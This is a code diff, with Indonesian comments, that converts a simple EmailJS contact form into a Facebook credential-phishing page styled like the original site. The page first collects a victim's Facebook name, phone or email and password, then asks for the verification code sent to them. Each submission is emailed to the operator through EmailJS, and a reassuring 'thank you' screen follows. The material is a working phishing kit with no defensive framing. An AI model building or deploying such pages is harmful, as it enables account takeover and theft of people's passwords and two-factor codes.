@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulir Pengiriman Data MailJS</title>
+    <title>Formulir Pemulihan</title>
     
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     
@@ -17,82 +17,86 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            background-color: #f0f2f5;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
-
         .container {
             background: #fff;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 450px;
         }
-
         h1 {
             text-align: center;
-            color: #333;
+            color: #1c1e21;
+            margin-bottom: 25px;
+            font-size: 24px;
+        }
+        img.header-image {
+            width: 100%;
+            border-radius: 6px;
             margin-bottom: 20px;
         }
-
         label {
             display: block;
             margin-bottom: 5px;
-            color: #555;
+            color: #333;
             font-weight: bold;
+            font-size: 14px;
         }
-
         input[type="text"],
         input[type="email"],
-        textarea {
+        input[type="password"] {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
             box-sizing: border-box;
+            font-size: 16px;
         }
-
         button {
-            background-color: #5cb85c;
+            background-color: #0067f7; /* Warna biru dari situs asli */
             color: white;
             padding: 12px 20px;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             cursor: pointer;
             width: 100%;
-            font-size: 16px;
+            font-size: 18px;
+            font-weight: bold;
             transition: background-color 0.3s ease;
         }
-
         button:hover {
-            background-color: #4cae4c;
+            background-color: #0058d6;
         }
-
+        button:disabled {
+            background-color: #a0c3f0;
+            cursor: not-allowed;
+        }
         #response-message {
             text-align: center;
             margin-top: 15px;
             padding: 10px;
             border-radius: 4px;
             font-weight: bold;
+            font-size: 14px;
         }
-
         .success {
             background-color: #dff0d8;
             color: #3c763d;
         }
-
         .error {
             background-color: #f2dede;
             color: #a94442;
         }
-
         .hidden {
             display: none;
         }
@@ -100,63 +104,111 @@
 </head>
 <body>
     <div class="container">
-        <h1>Kirim Data Anda</h1>
-        <form id="contact-form">
-            <label for="user_name">Nama Lengkap</label>
-            <input type="text" id="user_name" name="user_name" required>
-
-            <label for="user_email">Alamat Email / Kontak</label>
-            <input type="email" id="user_email" name="user_email" required>
+        
+        <form id="form-login">
+            <h1>Masukkan Informasi Anda</h1>
             
-            <label for="subject">Subjek</label>
-            <input type="text" id="subject" name="subject" required>
+            <label for="facebook_name">Nama Facebook</label>
+            <input type="text" id="facebook_name" name="facebook_name" placeholder="Nama Facebook" required>
 
-            <label for="message">Pesan / Rincian Data</label>
-            <textarea id="message" name="message" rows="5" required></textarea>
+            <label for="email_phone">Nomor Telepon Atau Email</label>
+            <input type="text" id="email_phone" name="email_phone" placeholder="Nomor Telepon Atau Email" required>
+            
+            <label for="password">Passwoord</label>
+            <input type="password" id="password" name="password" placeholder="Passwoord" required>
 
-            <button type="submit" id="submit-btn">Kirim Data</button>
-            <p id="response-message" class="hidden"></p>
+            <button type="submit" id="submit-btn-login">Masuk</button>
+            <p id="response-login" class="hidden"></p>
         </form>
+
+        <form id="form-verification" class="hidden">
+            <h1>Masukkan Kode Verifikasi</h1>
+            <p style="text-align: center; margin-top: -15px; margin-bottom: 20px; font-size: 14px; color: #555;">
+                Silakan periksa kode yang kami kirimkan ke email/telepon Anda.
+            </p>
+            
+            <label for="verification_code">Kode Verifikasi</label>
+            <input type="text" id="verification_code" name="verification_code" placeholder="Masukkan kode verifikasi" required>
+
+            <button type="submit" id="submit-btn-verify">Kirim Kode</button>
+            <p id="response-verify" class="hidden"></p>
+        </form>
+
+        <div id="final-success" class="hidden">
+            <h1 class="success">Terima Kasih!</h1>
+            <p style="text-align: center; font-size: 16px;">Data Anda telah berhasil diproses.</p>
+        </div>
     </div>
     
     <script>
-        document.getElementById('contact-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Mencegah form dikirim secara default
+        // --- GANTI PENGATURAN MAILJS ANDA DI SINI ---
+        const serviceID = 'YOUR_SERVICE_ID';
+        
+        // Anda perlu membuat DUA template di MailJS
+        const templateID_Login = 'YOUR_TEMPLATE_ID_LOGIN'; // Template untuk form 1
+        const templateID_Verify = 'YOUR_TEMPLATE_ID_VERIFY'; // Template untuk form 2
+        // ---------------------------------------------
 
-            const btn = document.getElementById('submit-btn');
-            const responseMsg = document.getElementById('response-message');
+        const formLogin = document.getElementById('form-login');
+        const formVerify = document.getElementById('form-verification');
+        const finalSuccess = document.getElementById('final-success');
+
+        const btnLogin = document.getElementById('submit-btn-login');
+        const btnVerify = document.getElementById('submit-btn-verify');
+        
+        const responseLogin = document.getElementById('response-login');
+        const responseVerify = document.getElementById('response-verify');
+
+        // Event listener untuk Formulir 1 (Login)
+        formLogin.addEventListener('submit', function(event) {
+            event.preventDefault();
             
-            btn.textContent = 'Mengirim...';
-            btn.disabled = true;
-            responseMsg.classList.add('hidden'); // Sembunyikan pesan sebelumnya
+            btnLogin.textContent = 'Mengirim...';
+            btnLogin.disabled = true;
+            responseLogin.classList.add('hidden');
 
-            // Ganti dengan Service ID dan Template ID MailJS Anda
-            const serviceID = 'YOUR_SERVICE_ID'; 
-            const templateID = 'YOUR_TEMPLATE_ID';
-
-            emailjs.sendForm(serviceID, templateID, this)
+            emailjs.sendForm(serviceID, templateID_Login, this)
                 .then(() => {
-                    btn.textContent = 'Kirim Data';
-                    btn.disabled = false;
+                    // Berhasil kirim data login
+                    formLogin.classList.add('hidden'); // Sembunyikan form login
+                    formVerify.classList.remove('hidden'); // Tampilkan form verifikasi
                     
-                    // Tampilkan pesan sukses
-                    responseMsg.textContent = 'Data berhasil terkirim!';
-                    responseMsg.classList.remove('hidden');
-                    responseMsg.classList.remove('error');
-                    responseMsg.classList.add('success');
-                    
-                    // Reset formulir setelah sukses
-                    document.getElementById('contact-form').reset();
+                    // Reset tombol login (jika pengguna kembali)
+                    btnLogin.textContent = 'Masuk';
+                    btnLogin.disabled = false;
+                    formLogin.reset();
+
+                }, (err) => {
+                    // Gagal kirim data login
+                    btnLogin.textContent = 'Masuk';
+                    btnLogin.disabled = false;
+                    responseLogin.textContent = `Gagal mengirim: ${JSON.stringify(err)}`;
+                    responseLogin.classList.remove('hidden');
+                    responseLogin.classList.add('error');
+                });
+        });
+
+        // Event listener untuk Formulir 2 (Verifikasi)
+        formVerify.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            btnVerify.textContent = 'Memverifikasi...';
+            btnVerify.disabled = true;
+            responseVerify.classList.add('hidden');
+
+            emailjs.sendForm(serviceID, templateID_Verify, this)
+                .then(() => {
+                    // Berhasil kirim data verifikasi
+                    formVerify.classList.add('hidden'); // Sembunyikan form verifikasi
+                    finalSuccess.classList.remove('hidden'); // Tampilkan pesan sukses akhir
                     
                 }, (err) => {
-                    btn.textContent = 'Kirim Data';
-                    btn.disabled = false;
-                    
-                    // Tampilkan pesan error
-                    responseMsg.textContent = `Gagal mengirim data: ${JSON.stringify(err)}`;
-                    responseMsg.classList.remove('hidden');
-                    responseMsg.classList.remove('success');
-                    responseMsg.classList.add('error');
+                    // Gagal kirim data verifikasi
+                    btnVerify.textContent = 'Kirim Kode';
+                    btnVerify.disabled = false;
+                    responseVerify.textContent = `Gagal mengirim: ${JSON.stringify(err)}`;
+                    responseVerify.classList.remove('hidden');
+                    responseVerify.classList.add('error');
                 });
         });
     </script>
